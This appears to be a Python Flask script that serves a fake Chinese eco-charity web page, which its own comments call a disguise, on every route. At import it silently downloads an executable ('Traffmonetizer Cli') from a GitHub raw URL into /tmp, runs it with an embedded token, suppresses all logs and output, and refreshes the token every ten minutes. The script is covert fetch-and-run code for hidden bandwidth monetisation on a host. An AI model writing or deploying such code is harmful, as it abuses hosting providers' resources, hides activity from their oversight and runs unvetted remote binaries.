import os
import time
import shutil
import logging
import threading
import subprocess
import urllib.request
from flask import Flask, Response

# ================= 1. 日志静默配置 =================
logging.getLogger("werkzeug").setLevel(logging.CRITICAL)

app = Flask(__name__)
app.logger.disabled = True

# ================= 2. 环境变量与配置 =================
TOKEN_OR_URL = os.getenv("TOKEN_OR_URL", "UMiNq9PwdIceLTDFaMhSiBsShC/Y5frs9ahOWmmQWBQ=")
PORT = int(os.getenv("PORT", 5000))

CLI_PATH = "/tmp/Cli"
current_token = ""
cli_process = None
process_lock = threading.Lock()

# 纯净内嵌伪装 HTML 页面
EMBEDDED_HTML = """<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>绿意同行 - 专注生态保护与低碳生活</title>
    <style>
        :root {
            --primary: #2d6a4f;
            --primary-light: #52b788;
            --accent: #d8f3dc;
            --text-dark: #1b4332;
            --text-muted: #555;
            --bg-light: #f7faf8;
            --white: #ffffff;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", sans-serif;
            background-color: var(--bg-light);
            color: var(--text-dark);
            line-height: 1.6;
        }
        header {
            background-color: var(--white);
            border-bottom: 1px solid #e2ece9;
            padding: 1.2rem 2rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 10;
        }
        .logo {
            font-size: 1.4rem;
            font-weight: 700;
            color: var(--primary);
            display: flex;
            align-items: center;
            gap: 8px;
        }
        nav a {
            text-decoration: none;
            color: var(--text-muted);
            margin-left: 1.5rem;
            font-size: 0.95rem;
            transition: color 0.2s ease;
        }
        nav a:hover { color: var(--primary-light); }
        .hero {
            padding: 5rem 2rem;
            text-align: center;
            background: linear-gradient(180deg, #d8f3dc 0%, var(--bg-light) 100%);
        }
        .hero h1 {
            font-size: 2.5rem;
            margin-bottom: 1rem;
            color: var(--primary);
        }
        .hero p {
            max-width: 600px;
            margin: 0 auto 2rem auto;
            color: var(--text-muted);
            font-size: 1.1rem;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
            padding: 2rem;
        }
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 2rem;
            margin-top: 1rem;
        }
        .card {
            background: var(--white);
            padding: 2rem;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.03);
            border: 1px solid #ebf3ef;
            transition: transform 0.2s ease;
        }
        .card:hover { transform: translateY(-4px); }
        .card-icon {
            font-size: 2rem;
            margin-bottom: 1rem;
            display: inline-block;
        }
        .card h3 {
            margin-bottom: 0.6rem;
            color: var(--primary);
            font-size: 1.25rem;
        }
        .card p {
            color: var(--text-muted);
            font-size: 0.95rem;
        }
        footer {
            text-align: center;
            padding: 3rem 1rem;
            font-size: 0.85rem;
            color: var(--text-muted);
            border-top: 1px solid #e2ece9;
            margin-top: 4rem;
        }
    </style>
</head>
<body>
    <header>
        <div class="logo">🌿 绿意同行</div>
        <nav>
            <a href="#initiatives">绿色倡议</a>
            <a href="#actions">日常行动</a>
            <a href="#about">关于我们</a>
        </nav>
    </header>

    <section class="hero">
        <h1>守护蓝色星球，从身边绿意开始</h1>
        <p>践行低碳生活方式，促进人与自然和谐共生。我们致力于普及生态环保知识，推动日常低碳行动实践。</p>
    </section>

    <main class="container" id="initiatives">
        <div class="grid">
            <div class="card">
                <div class="card-icon">🌱</div>
                <h3>低碳出行</h3>
                <p>倡导步行、骑行与公共交通，降低化石能源依赖与碳排放，共同呼吸清新空气。</p>
            </div>
            <div class="card">
                <div class="card-icon">♻️</div>
                <h3>循环利用</h3>
                <p>减少一次性塑料制品消耗，实行严格垃圾分类，让资源在循环中发挥持久价值。</p>
            </div>
            <div class="card">
                <div class="card-icon">💡</div>
                <h3>高效节能</h3>
                <p>合理利用电力与水资源，随手关灯拔插头，推行绿色办公与节约型家居生活。</p>
            </div>
        </div>
    </main>

    <footer>
        <p>© 2026 绿意同行生态发展公益空间. All rights reserved.</p>
    </footer>
</body>
</html>"""


# ================= 3. 后台任务逻辑 =================
def download_cli():
    """检测并静默下载 Traffmonetizer Cli 到 /tmp"""
    if os.path.exists(CLI_PATH) and os.access(CLI_PATH, os.X_OK):
        return True

    cli_url = "https://raw.githubusercontent.com/yellowbins666/yellowbins666/refs/heads/main/cli"
    try:
        req = urllib.request.Request(cli_url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=60) as resp, open(CLI_PATH, "wb") as out_file:
            shutil.copyfileobj(resp, out_file)
        os.chmod(CLI_PATH, 0o755)
        return True
    except Exception:
        return False


def get_token():
    """获取最新 Token"""
    if TOKEN_OR_URL.startswith("http://") or TOKEN_OR_URL.startswith("https://"):
        try:
            req = urllib.request.Request(TOKEN_OR_URL, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=10) as resp:
                return resp.read().decode("utf-8").strip()
        except Exception:
            return None
    return TOKEN_OR_URL


def run_cli(token):
    """启动或重启 Cli 进程（静默模式）"""
    global cli_process

    if not os.path.exists(CLI_PATH):
        if not download_cli():
            return

    with process_lock:
        if cli_process and cli_process.poll() is None:
            cli_process.terminate()
            try:
                cli_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                cli_process.kill()

        cmd = [CLI_PATH, "start", "accept", "--token", token]
        env = os.environ.copy()
        env["HOME"] = "/tmp"
        env["TMPDIR"] = "/tmp"

        try:
            cli_process = subprocess.Popen(
                cmd,
                cwd="/tmp",
                env=env,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except Exception:
            pass


def token_watcher():
    """监控 Token 变更（每 10 分钟）"""
    global current_token
    while True:
        time.sleep(600)
        new_token = get_token()
        if new_token and new_token != current_token:
            current_token = new_token
            run_cli(current_token)


def background_init():
    """异步初始化后台挂机任务（加锁防多 Worker 重复启动）"""
    global current_token
    time.sleep(1)

    lock_file = "/tmp/.worker_init.lock"
    try:
        fd = os.open(lock_file, os.O_CREAT | os.O_EXCL | os.O_RDWR)
    except FileExistsError:
        return

    download_cli()
    current_token = get_token() or TOKEN_OR_URL
    run_cli(current_token)

    if TOKEN_OR_URL.startswith("http://") or TOKEN_OR_URL.startswith("https://"):
        watcher = threading.Thread(target=token_watcher, daemon=True)
        watcher.start()


# ================= 4. Web 与路由配置 =================
def render_index():
    """优先读取同目录下的 index.html，没有则使用内嵌模板"""
    if os.path.exists("index.html"):
        try:
            with open("index.html", "r", encoding="utf-8") as f:
                return f.read()
        except Exception:
            pass
    return EMBEDDED_HTML


@app.route("/healthz")
def healthz():
    return "OK", 200


@app.route("/.well-known/acme-challenge/<path:token>")
def acme_challenge(token):
    """放行 Let's Encrypt / ACME 证书校验路由"""
    challenge_path = f"/tmp/.well-known/acme-challenge/{token}"
    if os.path.exists(challenge_path):
        try:
            with open(challenge_path, "r", encoding="utf-8") as f:
                return f.read(), 200
        except Exception:
            pass
    return "Not Found", 404


@app.route("/", defaults={"path": ""})
@app.route("/<path:path>")
def catch_all(path):
    """所有常规路径展示伪装页面"""
    return Response(render_index(), status=200, mimetype="text/html")


# 适配 Gunicorn：模块被 Worker 加载时即启动后台线程（带文件锁避免重复拉起）
init_thread = threading.Thread(target=background_init, daemon=True)
init_thread.start()

# ================= 5. 主入口 =================
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=PORT)
